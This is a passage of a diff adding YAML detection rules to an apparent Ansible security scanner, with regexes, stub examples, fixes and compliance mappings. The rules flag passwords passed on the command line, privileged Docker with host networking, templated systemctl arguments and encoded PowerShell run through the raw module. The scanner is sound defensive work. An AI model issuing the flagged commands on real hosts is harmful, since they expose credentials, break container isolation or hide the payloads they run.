+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1', '6.3.2', '6.3.3']
+    soc2: ['CC7.1', 'CC8.1']
+
+  - id: "password_in_command_line"
+    category: "command_injection"
+    severity: "HIGH"
+    title: "Password in Command Line"
+    description: >-
+        Task passes -p'<literal>' on the command line. Process listings and Ansible
+        no_log defaults expose the password to anyone with host or log access.
+    regex: "^(?!\\s*#)\\s*(?:shell|command|raw):\\s*.*-p[\"'][^\"']*[\"']"
+    positive_examples:
+      - 'shell:-p""'
+    recommendation: "Tools' -p\"<password>\" appears in /proc/<pid>/cmdline and is readable by other local processes; switch to a credentials file (mode 0600) read with the tool's --defaults-extra-file / --password-file option, with the value sourced from Ansible Vault."
+    cwe: ["CWE-214", "CWE-798"]
+    owasp_appsec: ["A07:2021"]
+    owasp_asvs: ["V2.10.2", "V2.10.4", "V14.1.5"]
+    mitre_attack: ["T1552.001"]
+    cis_controls: ["CIS-3.1", "CIS-5.2"]
+    nist_controls: ['AC-3', 'IA-5', 'IA-5(1)', 'IA-5(7)', 'SC-28']
+    pci_dss: ['3.5.1', '8.3.6', '8.6.2']
+    hipaa: ['164.312(a)(2)(i)', '164.312(a)(2)(iv)', '164.312(d)']
+    soc2: ['C1.1', 'CC6.1']
+
+  - id: "database_with_embedded_password"
+    category: "command_injection"
+    severity: "HIGH"
+    title: "Database Command with Embedded Password"
+    description: >-
+        mysql/psql command embeds -p'<literal>' on argv. The password appears in
+        /proc/<pid>/cmdline, in Ansible diff output, and in shell history; rotate
+        and move to login_password parameters.
+    regex: "^(?!\\s*#)\\s*(?:shell|command|raw):\\s*.*(?:mysql|psql).*-p[^\\s]*[\"'][^\"']*[\"']"
+    positive_examples:
+      - 'shell:mysql-p""'
+    recommendation: "mysql/psql -p<password> leaks the credential via the process list; supply it via the env (PGPASSWORD), a my.cnf [client] section with mode 0600, or the module-native parameters (community.mysql.mysql_query login_password:, community.postgresql.postgresql_query login_password:) loaded from Vault."
+    cwe: ["CWE-214", "CWE-798"]
+    owasp_appsec: ["A07:2021"]
+    owasp_asvs: ["V2.10.2", "V2.10.4", "V14.1.5"]
+    mitre_attack: ["T1552.001"]
+    cis_controls: ["CIS-3.1", "CIS-5.2"]
+    nist_controls: ['AC-3', 'IA-5', 'IA-5(1)', 'IA-5(7)', 'SC-28']
+    pci_dss: ['3.5.1', '8.3.6', '8.6.2']
+    hipaa: ['164.312(a)(2)(i)', '164.312(a)(2)(iv)', '164.312(d)']
+    soc2: ['C1.1', 'CC6.1']
+
+  - id: "docker_privileged_with_host_access"
+    category: "command_injection"
+    severity: "CRITICAL"
+    title: "Docker Privileged with Host Access"
+    description: "Docker command runs privileged container with host network access"
+    regex: "^(?!\\s*#)\\s*(?:shell|command|raw):\\s*.*docker\\s+run.*--privileged.*--net=host"
+    positive_examples:
+      - "shell:docker run--privileged--net=host"
+    recommendation: "--privileged + --net=host effectively disables container isolation; replace with the minimum capabilities the workload requires (--cap-add=NET_ADMIN), drop the rest (--cap-drop=ALL), and use a user-defined network instead of host networking."
+    cwe: ["CWE-250", "CWE-269"]
+    owasp_appsec: ["A04:2021"]
+    owasp_asvs: ["V14.2.2"]
+    mitre_attack: ["T1611"]
+    cis_controls: ["CIS-4.1", "CIS-Docker"]
+    nist_controls: ['AC-6', 'AC-6(1)', 'AC-6(10)', 'CM-6', 'CM-7']
+    pci_dss: ['2.2.1', '2.2.4', '7.2.1']
+    hipaa: ['164.312(a)(1)']
+    soc2: ['CC6.3', 'CC7.1', 'CC8.1']
+
+  - id: "systemctl_with_user_input"
+    category: "command_injection"
+    severity: "HIGH"
+    title: "Systemctl with User Input"
+    description: "Systemctl command uses template variables which may be unsafe"
+    regex: "^(?!\\s*#)\\s*(?:shell|command|raw):\\s*.*systemctl.*\\{\\{[^}]*\\}\\}"
+    positive_examples:
+      - "shell:systemctl{{}}"
+    recommendation: "Validate the unit name against an explicit allow-list with ansible.builtin.assert (regex ^[a-zA-Z0-9_.@-]+$ AND membership in known-services), then call ansible.builtin.systemd_service: name=\"{{ unit }}\" state=... rather than shelling out to systemctl with a templated argument."
+    cwe: ["CWE-78"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ["T1059.004"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7', 'SI-3', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1']
+    soc2: ['CC7.1', 'CC8.1']
+
+  # -- Ansible raw Module with Encoded PowerShell -----------------------------
+  - id: "raw_encoded_powershell"
+    category: "command_injection"
+    severity: "CRITICAL"
+    title: "Raw Module with Encoded PowerShell"
+    description: "Uses Ansible raw module to execute base64-encoded PowerShell commands, hiding the actual payload"
+    regex: "(?:raw|ansible\\.builtin\\.raw):\\s*.*powershell\\s+.*-(?:Encoded|enc|e)\\s+"
+    positive_examples:
+      - "raw:powershell -Encoded "
+    recommendation: "Encoded PowerShell hides the actual command; decode and audit the payload"
+    cwe: ["CWE-78", "CWE-506"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ["T1027", "T1059.001"]
+    cis_controls: ["CIS-4.1"]
+    nist_controls: ['CM-6', 'CM-7', 'SI-3', 'SI-7', 'SI-10']
+    pci_dss: ['2.2.1', '2.2.4', '6.2.4', '6.3.1']
+    soc2: ['CC6.8', 'CC7.1', 'CC8.1']
